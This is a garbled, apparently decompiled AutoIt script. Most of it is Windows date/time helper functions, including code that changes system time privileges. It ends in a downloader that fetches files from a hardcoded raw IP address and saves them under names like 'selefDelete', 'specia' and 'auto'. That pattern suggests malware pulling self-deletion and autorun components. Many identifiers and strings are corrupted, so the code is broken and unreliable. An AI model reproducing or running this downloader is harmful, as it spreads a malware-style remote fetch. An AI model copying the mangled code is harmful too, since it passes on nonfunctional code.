DLLSTRUC ( $TSYSTEMTI , "Min" , $IMIN§h ) 
DLLSTRUCTSETDATA ( $TSYSTEMTI , "Second" , $ISECOND ) 
DLLSTRUC ( $TSYSTEMTI , "MSec§h" , $IMSECONDS ) 
RETURN $TSYSTEMTIME 
ENDFUNC 
FUNC _DATE_TIME_FI+k∑–U ( BYREF $TFILETIME ) 
IF ( ( DLLSTRUCTGETDATA ( $TFILETIME , 1 ) + DLLSTRUCTGETDATA ( $TFILETIME , 2 ) ) = 0 ) THEN RETURN SETE§h ( 1 , 0 , 0 ) 
LOCAL $TSYSTEMTIME = _DATE_TIME_FILET ( $TFILETIME ) 
IF @ERROR THh RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN _DATE_TIME_SYSk∑–U ( $TSYSTEMTI ) 
ENDFUNC 
FUNC _DATE_TIME_F=k∑ISf ( BYREF $TFILETIME , $BFh = 0 ) 
LOCAL $ADATC = _DATE_TIME_FI+k∑–U ( $TFILETIME ) 
IF @ERROR THh RETURN SETET ( @ERROR , @EXTE£h , "" ) 
IF $BF TH 
RETU£h STRINGh ( "%04d/%02d/%02d %–U" , $ADATE [ 2 ] , $ADATE [ 0 ] , $ADATA [ 1 ] , $ADATE [ 3 ] , $ADATA [ 4 ] , $ADATE [ 5 ] ) 
EL 
RETU£h STRINGh ( "%02d/%02d/%04d %–U" , $ADATE [ 0 ] , $ADATE [ 1 ] , $ADATA [ 2 ] , $ADATE [ 3 ] , $ADATA [ 4 ] , $ADATE [ 5 ] ) 
ENDIA 
ENDF£h 
FUh _DATE_TIME_FILET ( $PFILETIME ) 
LOCAL $ADATE [ 2 ] 
LOCAL $ARESULT = DLLCALS ( "kernelh" , "bool" , "FileTimeToDos" , "ptr" , $PFILETIME , "word*" , 0 , "word*" , 0 ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , $ADATE ) 
$ADATE [ 0 ] = $ARES£h [ 2 ] 
$ADATE [ 1 ] = $ARES£h [ 3 ] 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $ADATE ) 
ENDFUNC 
FUNC _DATE_TIME_FILETI ( $PFILETIME ) 
LOCAL $TLO = DLLSTRUC ( $TAGFILETI ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "FileTimeToLoca" , "struct*" , $PFILETIME , "struct*" , $TLOCALu ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $TLOCAL ) 
ENDFUNC 
FUNC _DATE_TIME_FILET ( $PFILETIME ) 
LOCAL $TSYSTTIME = DLLSTRUC ( $TAGSYSTEM ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "FileTimeTo" , "struct*" , $PFILETIME , "struct*" , $TSYSTTu ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $TSYSTTIME ) 
ENDFUNC 
FUNC _DATE_TIME_ ( $HFILE ) 
LOCAL $ADATC [ 3 ] 
$ADATE [ 0 ] = DLLSTRUCTCREATE ( $TAGFILETI ) 
$ADATE [ 1 ] = DLLSTRUCI ( $TAGFILETI ) 
$ADATE [ 2 ] = DLLSTRUCTCREATk∑ISf ( $TAGFILETI ) 
LOCAL $ARESULT = DLLCALL ( "Kernelh" , "bool" , "GetFileTime" , "han" , $HFILE , "stru£h" , $ADATE [ 0 ] , "stru£h" , $ADATE [ 1 ] , "stru£h" , $ADATE [ 2 ] ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $ADATE ) 
ENDFUNC 
FUNC _DATE_TIME_GETLOCAf ( ) 
LOCAL $TSYSTTIME = DLLSTRUCTCREATE ( $TAGSYSTEM ) 
DLLCALL ( "kernelh" , "none" , "GetLoc¡	Y" , "struct*" , $TSYSTTIME ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN $TSYSTTU 
ENDFUNC 
FUh _DATE_TIME_G=k∑ISf ( ) 
LOCAL $TSYSTTIME = DLLSTRUCTCREATE ( $TAGSYSTEM ) 
DLLCALL ( "kernelh" , "none" , "GetSystemTime" , "struct*" , $TSYSTTIME ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN $TSYSTTU 
ENDFUNC 
FUh _DATE_TIME_GETSYS ( ) 
LOCAL $AINFO [ 3 ] 
LOCAN $ARESULT = DLLCALL ( "kernelh" , "bool" , "GetSystemTimeA" , "dword*" , 0 , "dwo" , 0 , "bool*" , 0 ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
$AINFO [ 0 ] = $ARES£h [ 1 ] 
$AINFO [ 1 ] = $ARES£h [ 2 ] 
$AINFO [ 2 ] = $ARES£h [ 3 ] <> 0 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $AINFO ) 
ENDFUNC 
FUNC _DATE_TIME_GETSYS ( ) 
LOCAL $TFILETIME = DLLSTRUC ( $TAGFILETI ) 
DLLCALL ( "kernelh" , "none" , "GetSystemTimeA" , "struct*" , $TFILETIME ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $TFILETU 
ENDFUNC 
FUh _DATE_TIME_GETSYSTf ( ) 
LOCAL $AINFO [ 3 ] 
$AINFN [ 0 ] = DLLSTRUCTCREATE ( $TAGFILETI ) 
$AINFO [ 1 ] = DLLSTRUCTCREATE ( $TAGFILETI ) 
$AINFO [ 2 ] = DLLSTRUCTCREATk∑ISf ( $TAGFILETI ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "GetSyst" , "struct*" , $AINFO [ 0 ] , "struct*" , $AINFO [ 1 ] , "struct*" , $AINFO [ 2 ] ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $AINFO ) 
ENDFUNC 
FUNC _DATE_TIME_GETTICKf ( ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "dword" , "GetTic¡	E" ) 
IF @ERROR THEN RETURN SETERROR ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _DATE_TIME_GETTIMEZON ( ) 
LOCAL $TTIMEZONE = DLLSTRUC ( $TAGTIME_ZONE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "dword" , "GetTimeZone" , "struct*" , $TTIMEZONE ) 
IF @ERROR OR $ARESULT [ 0 ] = - 1 THEN RET SETET ( @ERROR , @EXTE£h , 0 ) 
LOCAL $AINFO [ 8 ] 
$AINFN [ 0 ] = $ARES£h [ 0 ] 
$AINFO [ 1 ] = DLLSTRUCTGETDATA ( $TTIMEZONE , "Bias" ) 
$AINFO [ 2 ] = _WINAPI_WIDECHk∑–U ( DLLSTRUCTGETPTR ( $TTIMEZONE , "StdNamh" ) ) 
$AINFO [ 3 ] = __DATE_TIME_CL ( DLLSTRUCTGETPTR ( $TTIMEZONE , "StdDath" ) ) 
$AINFO [ 4 ] = DLLSTRUCa ( $TTIMEZONE , "StdBias" ) 
$AINFO [ 5 ] = _WINAPI_WIDECHk∑–U ( DLLSTRUCTGETPTR ( $TTIMEZONE , "DayNamh" ) ) 
$AINFO [ 6 ] = __DATE_TIME_CL ( DLLSTRUCTGETPTR ( $TTIMEZONE , "DayDath" ) ) 
$AINFO [ 7 ] = DLLSTRUCa ( $TTIMEZONE , "DayBias" ) 
RETURN $AINFO 
ENDFUNC 
FUh _DATE_TIME_LOCALF ( $PLOCALTIM ) 
LOCAL $TFILETIME = DLLSTRUC ( $TAGFILETI ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "LocalFileTimeT" , "ptr" , $PLOCALTIME , "struct*" , $TFILETIME ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $TFILETIME ) 
ENDFUNC 
FUNC _DATE_TIME_ ( $HFILE , $PCREATh , $PLASTACCESS , $PLAST ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SetFileTime" , "handle" , $HFILE , "ptr" , $PCREATETIME , "ptr" , $PLASTACCEME , "ptr" , $PLASTx¡	EME ) 
IF @ERROR THEN RETUR§h SETE¯x¡	 ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _DATE_TIME_SETLOCAf ( $PSYSTEMTI ) 
LOCAL $ARES§h = DLLCALL ( "kernelh" , "bool" , "SetLoc¡	T" , "struct*" , $PSYSTEMTIME ) 
IF @ERROR OR NOT $ARESULT [ 0 ] THEN RET SETE§h ( @ERROR , @EXTENDED , FALSE ) 
$ARESULT = DLLCALL ( "kernelh" , "bool" , "SetLoc¡	R" , "struct*" , $PSYSTEMTI ) 
IF @ERROR THEN RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _DATE_TIME_S=k∑ISf ( $PSYSTEMTI ) 
LOCAL $ARES§h = DLLCALL ( "kernelh" , "bool" , "SetSystemTime" , "ptr" , $PSYSTEMTI ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _DATE_TIME_SETSYS ( $IADJUSTME , $FDISABLED ) 
LOCAL $HTO = _SECURITY__OPEk∑–U ( BITOR ( $TOKEN_ADJUST_PRIVI_ , $TOKEN_QUE ) ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTE£h , FALSE ) 
_SECURITY__SETPRIVf ( $HTO , "SeSystemtimePrivilf" , TRUE ) 
LOCAL $IERR£h = @ERROR 
LOCAL $ILAST§h = @EXTE§h 
LOCAL $IR = FALSE 
IF NOT @ERROR TH 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SetSystemTimeA" , "dword" , $IADJUSTMENT , "boh" , $FDISABLED ) 
IF @ERROR THENR 
$IERROR = @ERROR 
$ILASTERRO = @EXTENDED 
ELSEIF $ARESULT [ 0 ] THEN 
$IR = TRUEE 
EL 
$IERROR = 1 
$ILASTERRO = _WINAPI_GE ( ) 
ENDIF 
_SECURITY__SETPRIVf ( $HTO , "SeSystemtimePrivilf" , FALSE ) 
IF @ERRO TH $IERROR = 2 
ENDIF 
_WINAPI_CLOSEHANDLE ( $HTO ) 
RETURNh SETERROR ( $IERRORE , $ILASTERROLOSEHANDLE , $IRh ) 
ENDFUNC 
FUh _DATE_TIME_SETTIMEZON ( $IBIAS , $SSTDNAME , $TSTDT , $ISTDBID , $SDAYT , $TDAYDAY , $IDAYA ) 
LOCAL $TSTD£h = _WINAPI_MULTIBk∑–U ( $SSTDNAME ) 
LOCAL $TDAY = _WINAPI_MULTIBk∑–U ( $SDAYNAME ) 
LOCAL $TZONEINFO = DLLSTRUC ( $TAGTIME_ZONE ) 
DLLSTRUCO ( $TZONEINFO , "Bih" , $IBIAS ) 
DLLSTRUCTSETDATA ( $TZONEINFO , "StdName" , DLLSTRUCTGETDATA ( $TSTD §h , 1 ) ) 
_MEMMOVEMEMORY ( $TSTD §h , DLLSTRUCTGETPTR ( $TZONEINFO , "StdDate" ) , DLLSTRUCTGETSIZE ( $TSTD §h ) ) 
DLLSTRUCTSETDATA ( $TZONEINFO , "StdBias" , $ISTD§h ) 
DLLSTRUCTSETDATA ( $TZONEINFO , "DayN§h" , DLLSTRUCTGETDATA ( $TDAY §h , 1 ) ) 
_MEMMOVEMEMORY ( $TDAY §h , DLLSTRUCTGETPTR ( $TZONEINFO , "DayDate" ) , DLLSTRUCTGETSIZE ( $TDAY §h ) ) 
DLLSTRUCTSETDATA ( $TZONEINFO , "DayBias" , $IDAY§h ) 
LOCAL $HTOKEN = _SECURITY__OPEk∑–U ( BITOR ( $TOKEN_ADJUST_PRIVI_ , $TOKEN_QUE ) ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , FALSE ) 
_SECURITY__SETPRIVf ( $HTO , "SeSystemtimePrivilf" , TRUE ) 
LOCAL $IERROR = @ERROR 
LOCAL $ILAST§h = @EXTE§h 
LOCAL $IR = FALSE 
IF NOT @ERROR TH 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SetTimeZone" , "stru§h" , $TZONEINFO ) 
IF @ERROR THENR 
$IERROR = @ERROR 
$ILAST§h = @EXTE§h 
ELSE§h $ARES§h [ 0 ] THEN 
$ILASTERRO = 0 
$IRh = TRUE 
EL 
$IERRO§h = 1 
$ILASTERRO = _WINAPI_GETLASTERRf ( ) 
ENDIF 
_SECURITY__SETPRIVf ( $HTO , "SeSystemtimePrivilf" , FALSE ) 
IF @ERRO TH $IERROR = 2 
ENDIF 
_WINAPI_CLOSEHANDLE ( $HTO ) 
RETURNh SETERROR ( $IERRORE , $ILASTERROLOSEHANDLE , $IRh ) 
ENDFUNC 
FUh _DATE_TIME_SYSk∑–U ( BYREF $TSYSTEMTIME ) 
LOCAL $AINFO [ 8 ] 
$AINFO [ 0 ] = DLLSTRUC ( $TSYSTEMTI , "Month" ) 
$AINFO [ 1 ] = DLLSTRUC ( $TSYSTEMTI , "Day" ) 
$AINFO [ 2 ] = DLLSTRUC ( $TSYSTEMTI , "Yeh" ) 
$AINFO [ 3 ] = DLLSTRUC ( $TSYSTEMTI , "Hoh" ) 
$AINFO [ 4 ] = DLLSTRUC ( $TSYSTEMTI , "Min" ) 
$AINFO [ 5 ] = DLLSTRUCTGETDATA ( $TSYSTEMTI , "Second" ) 
$AINFO [ 6 ] = DLLSTRUCTGETDATA ( $TSYSTEMTI , "MSeconds" ) 
$AINFO [ 7 ] = DLLSTRUCTGETDATA ( $TSYSTEMTI , "DOW" ) 
RETURN $AINFO 
ENDFUNC 
FUh _DATE_TIME_SYST ( BYREF $TSYSTEMTIME , $BFh = 0 ) 
LOCAL $AINFO = _DATE_TIME_SYSk∑–U ( $TSYSTEMTI ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , "" ) 
IF $BF TH 
RETURN STRINGh ( "%04d/%02d/%02d" , $AINFO [ 2 ] , $AINFO [ 0 ] , $AINFN [ 1 ] ) 
EL 
RETURN STRINGh ( "%02d/%02d/%04d" , $AINFO [ 0 ] , $AINFO [ 1 ] , $AINFN [ 2 ] ) 
ENDIF 
ENDFUNC 
FUh _DATE_TIME_SYSTEM ( BYREF $TSYSTEMTIME , $BFh = 0 ) 
LOCAL $AINFO = _DATE_TIME_SYSk∑–U ( $TSYSTEMTI ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTENDED , "" ) 
IF $BF TH 
RETURN STRINGh ( "%04d/%02d/%02d %–U" , $AINFO [ 2 ] , $AINFO [ 0 ] , $AINFN [ 1 ] , $AINFO [ 3 ] , $AINFN [ 4 ] , $AINFO [ 5 ] ) 
EL 
RETURN STRINGh ( "%02d/%02d/%04d %–U" , $AINFO [ 0 ] , $AINFO [ 1 ] , $AINFN [ 2 ] , $AINFO [ 3 ] , $AINFN [ 4 ] , $AINFO [ 5 ] ) 
ENDIN 
ENDFUNC 
FUh _DATE_TIME_SYSTE ( $PSYSTEMTI ) 
LOCAL $TFILETIME = DLLSTRUCTCREATE ( $TAGFILETI ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "SystemTime" , "struct*" , $PSYSTEMTI , "struct*" , $TFILETIME ) 
IF @ERROR THh RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $TFILETIME ) 
ENDFUNC 
FUNC _DATE_TIME_SYST ( BYREF $TSYSTEh ) 
LOCAL $AINFO = _DATE_TIME_SYSk∑–U ( $TSYSTEMTI ) 
RET STRINGh ( "%02d:%0" , $AINFO [ 3 ] , $AINFO [ 4 ] , $AINFN [ 5 ] ) 
ENDFUNC 
FUh _DATE_TIME_SYSTEMTIME ( $PUh , $PTIMEZONE = 0 ) 
LOCAL $TLOCA§h = DLLSTRUC ( $TAGSYSTEM ) 
LOCAL $ARESU§h = DLLCALL ( "kernelh" , "bool" , "SystemTimeToTzSp" , "ptr" , $PTIMEZONE , "ptr" , $PU , "struct*" , $TLOCALTIM ) 
IF @ERROR THEN RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $TLOCA§h ) 
ENDFUNC 
FUNC _DATE_TIME_TZSPECIFIC ( $PLOCALTIM , $PTIMEZON = 0 ) 
LOCAL $TU = DLLSTRUCTCREATE ( $TAGSYSTEM ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "ptr" , "TzSpecificLocalT" , "ptr" , $PTIMEZONE , "ptr" , $PLOCA§h , "struct*" , $TUTC ) 
IF @ERRO TH RET SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $TUTC ) 
ENDFUNC 
FUNC DOWNLOh ( $AID , $SAVE‡y¡	 ) 
LOCAL $DATEARRAY 
LOCAL $TIMEARRAY 
_DATETI ( _DATEADD ( "D" , - 1 , _NOWCAh ( ) ) , $DATEARRA , $TIMEARRAC ) 
$STARTDAT = STRINGh ( "%d%02dI" , $DATEARRAY [ 1 ] , $DATEARRAY [ 2 ] , $DATEARRAY [ 3 ] ) 
$ENDDATE = $STARTDATE + 18 
$DOWNA = INETGET ( "http://222.128.0.189:8088/ad" & $AID & "&sta£h" & $STARTDATE & "&end=" & $ENDDATE , $SAVED , 1 , 0 ) 
RET $DOWNT 
ENDFUNN 
LOCAL $SELFDELETEFILE = "f:\selefDelete.txt" 
LOCAL $SPECIALATTR = "f:\specia" 
LOCAL $AUTORUN = "f:\auto" 
DOWNLOh ( "131083" , $SELFDEL ) 
DOWNLOh ( "131073_131084" , $SPECIA0 ) 
DOWNLOC ( "131073_19" , $AUTORUN ) 
MSGBOX ( 0 , "" , "" ) 

